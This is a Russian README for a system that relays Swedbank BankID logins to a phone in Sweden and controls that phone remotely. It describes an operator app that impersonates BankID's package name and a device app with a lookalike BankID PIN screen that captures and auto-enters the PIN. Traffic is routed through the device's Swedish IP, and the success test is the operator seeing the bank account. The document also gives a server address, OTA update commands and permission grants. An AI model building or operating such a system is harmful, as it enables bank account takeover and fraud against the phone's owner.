# Pult — A-app и B-app

**Статус:** приватная песочница / не для распространения / только личное использование владельца

Этот репозиторий — приватная система управления собственными устройствами владельца
в Швеции с его телефона-оператора. Это **не** продукт: не публикуется и не даёт
доступа третьим лицам. Железные правила проекта — в `AGENTS.md`.

---

## 1. Терминология — как называются наши приложения

| Имя | Что | Пакет | Исходники | Устройство |
|---|---|---|---|---|
| **A-app** | Приложение устройства, остаётся в Швеции | `se.pult.app` | `android/grandma/` (Kotlin) | Redmi |
| **B-app** | Приложение оператора, которое управляет | `com.bankid.bus` | `app/` (Flutter) | Note 10; при разработке — эмулятор Mac |
| **Сервер** | Релей/хаб на VPS | — | `server/` (Node.js) | `85.190.98.57` |

- Одной **A-app** можно управлять с **B-app**.
- Одна **B-app** может управлять **несколькими A-app**.
- **Где что живёт при разработке:** B-app ставится на эмулятор
  (`moderator_test`, adb `emulator-5554`) — оттуда работает весь операторский UI
  (список устройств, чек-лист активации, диплинки) против боевого Redmi.
  A-app — только на Redmi. Внимание: B-app носит пакет `com.bankid.bus`, поэтому
  на эмуляторе она заменяет настоящий BankID (перед установкой B-app его надо
  удалить: `adb uninstall com.bankid.bus`).

---

## 2. Архитектура

```
B-app (Note 10, оператор)                Сервер (VPS, Node.js)          A-app (Redmi, Швеция)
──────────────────────────               ──────────────────────         ─────────────────────
Список A-app (имя/модель/OS/IP)          /ws      сигналинг             PultService (foreground)
Перехват bankid://-диплинков  ──wss──►   /link    релей диплинков ─wss─► BankIdAgent → BankID → PIN
CONNECT-прокси 127.0.0.1:8877 ──wss──►   /tunnel  TCP-релей      ──wss─► TunnelEgress → шведский IP
Трансляция экрана (WebView)   ──wss──►   /lowlat  H.264-релей    ──wss─► LowLat-стример
                                         /api/update  OTA apk/dex
```

Сервер сознательно «глупый»: не хранит PIN-коды и секреты пар, не видит контента —
только релей и журнал метаданных (ротация 90 дней).

---

## 3. B-app (операторское, Note 10)

- **Никогда не хранит PIN-коды.** В B-app вообще нет обработки PIN.
- **Список устройств:** все подключённые к серверу A-app —
  имя (необязательно), модель, OS и IP, плюс онлайн-статус.
- **Для выбранного устройства предлагается:**
  - **Пересылка диплинка** — Swedbank → «Logga in» → `bankid://` перехватывается
    B-app и через сервер уходит в выбранную A-app, которая открывает BankID и вводит
    код локально. B-app сразу уходит в фон (moveTaskToBack).
  - **«Отправить весь трафик через устройство»** — переключатель ставит системный
    прокси `127.0.0.1:8877` (CONNECT-прокси). Весь веб-трафик Note 10 выходит через
    A-app, и Note 10 получает **тот же публичный IP, что и A-app** в Швеции.
    Кнопка «Проверить публичный IP» подтверждает исходящий адрес.
  - **Трансляция экрана** — низколатентный просмотр экрана A-app с обратным вводом.
  - **Чек-лист активации («Aktivering»)** — статусы шагов настройки A-app
    (уведомления, батарея, статистика, оверлей, автозапуск, привязка) с кнопкой
    «Öppna» у каждого: одно нажатие шлёт кадр `setup-open`, и A-app открывает
    нужный системный экран настроек. Опрос — кадром `setup-query` (авто при
    открытии страницы + «Uppdatera»), ответ — `setup-status`.
- Foreground-сервис (KeepAliveService) держит WebSocket-канал живым.

## 4. A-app (устройство, Redmi в Швеции)

В рабочем режиме A-app — **сервис без кнопок**. Экраны:

1. **PIN-экран (`BankIdPinActivity`)** — выглядит 1:1 как PIN-экран BankID.
   Zero-click: 6-я цифра сохраняет код и закрывает экран, кнопок
   подтверждения нет. Код хранится
   **только здесь**, локально и зашифрованным (`PinStorage`), и никогда не
   покидает устройство.
2. **Экран спаривания/статуса (`PairingActivity`)** — подключение к серверу.
3. **Тихий статус (`MainActivity`)** — только состояние службы и связи, без единой
   кнопки. Настройка (батарея/оверлей/уведомления/…) ведётся удалённо из B-app:
   кадры `/link` `setup-open` (открыть системный экран шага) и `setup-query`
   (опрос), ответ — `setup-status`. Локальная отладка без сервера:
   `pult://setup?step=<id>` (рядом с `pult://bankid-login`).

Остальные компоненты: `PultService` (/ws-агент + /tunnel), `BankIdAgent`
(PIN-сценарий), `LanShell`/`AdbShell` (shell себе), `RemoteControlService`
(accessibility — никогда не активна во время BankID), `UpdateManager` (OTA через
/api/update).

> **Золотое правило (AGENTS.md):** PIN-процесс (adb_wifi_enabled=0 → смерть
> adbd-сессии → raiseBankId → injectInputEvent через scrcpy-server) выстрадан
> эмпирически и **не изменяется** без повторного E2E-теста входа.

---

## 5. Сервер (VPS)

Адрес: **`wss://85.190.98.57.sslip.io:8445`** (HTTPS/WSS через Caddy + Let's Encrypt).

| Канал | Назначение |
|---|---|
| `/ws` | Сигналинг (пары, присутствие, heartbeat) |
| `/link` | Диплинк B-app → A-app + статус подписания обратно; кадры настройки `setup-open` / `setup-query` / `setup-status` |
| `/tunnel` | Мультиплексированные TCP-потоки (веб-трафик B-app выходит через A-app) |
| `/lowlat` | Релей H.264-экрана |
| `/agent` | Командный канал (AGENT_TOKEN) |
| `/api/update` + `/update/<файл>` | OTA: загрузка apk/dex, push `update-available` |
| `/panel/<файл>` | Статика: `lowlat.html`, раздача APK (`a-app.apk`, `b-app.apk`) |

### Раздача APK

```
https://85.190.98.57.sslip.io:8445/panel/b-app.apk   (B-app, оператор)
https://85.190.98.57.sslip.io:8445/panel/a-app.apk   (A-app, устройство в Швеции)
```

---

## 6. Эксплуатация

```bash
# Сервер локально
cd server && npm install && npm start        # PORT=8080
cd server && npm test                        # модульные тесты

# Сборка APK
cd android && ./gradlew :grandma:assembleRelease     # A-app
cd app && flutter build apk --release                # B-app

# Первичная настройка устройства с A-app (одна команда)
node scripts/setup-device.mjs phone <serial> --bankid-pin <PIN> --lock-pin <КОД>

# OTA-обновление A-app (нужен AGENT_TOKEN)
curl -X PUT https://85.190.98.57.sslip.io:8445/api/update \
  -H 'x-agent-token: <AGENT_TOKEN>' -H 'x-update-kind: apk' \
  -H 'x-update-version: <версия>' -H "x-sha256: <sha256>" --data-binary @a-app.apk
curl -X POST https://85.190.98.57.sslip.io:8445/api/update/notify \
  -H 'x-agent-token: <AGENT_TOKEN>' -H 'content-type: application/json' -d '{"kind":"apk"}'
```

MIUI-разрешения на устройстве с A-app (сбрасываются при `pm install -r` — выдать заново):

```bash
appops set se.pult.app SYSTEM_ALERT_WINDOW allow
appops set se.pult.app 10021 allow   # запуск активности из фона
```

> **Подпись APK при OTA (поймано 2026-09-12):** debug-сборки подписываются
> ключом машины сборки (`~/.android/debug.keystore`). Если на устройстве стоит
> сборка с чужого ключа (например, с Windows-ПК ALSH), обновление с Mac падает с
> `INSTALL_FAILED_UPDATE_INCOMPATIBLE` — ни тихий `pm install -r`, ни системный
> установщик его не примут. Лечится только удалением приложения (теряются
> привязка к паре и сохранённый PIN — потребуется повторная настройка
> `setup-device.mjs phone ...` по USB) либо сборкой с того же ключа.
> Поэтому собирать релизы для OTA надо всегда на одной машине.

---

## 7. Обязательный E2E-тест после правок рядом со входом

Swedbank → Logga in → (ничего не делать) → Note 10 показывает счёт.
Эталонные скрины: `tools/success-1..3.png`, `tools/success-autonomous.png`.

Подробности: `docs/rapport.sv.md` (проверенный технический отчёт, шведский).

---

## 8. Живые экраны на ALSH (Windows-ПК у устройств)

Железное правило: окна scrcpy **Note 10** и **Redmi** на рабочем столе ALSH видны
**всегда** — это единственный «глаз» на телефоны, оператор не может подойти к ним
физически. scrcpy не перезапускает себя сам, поэтому за этим следит сторож:

```powershell
# разовая установка автозапуска (PowerShell от Администратора, после git pull):
powershell -ExecutionPolicy Bypass -File scripts\install-win-screens-watchdog.ps1
```

Задача Планировщика `PultScreensWatchdog` поднимает
`scripts/win-screens-watchdog.ps1` при входе в систему и перезапускает его при
падении. Сторож каждые 15 с проверяет: adb видит оба серийника и окно scrcpy
каждого живо — иначе переподнимает. Лог: `test_logs/win-screens-watchdog.log`.
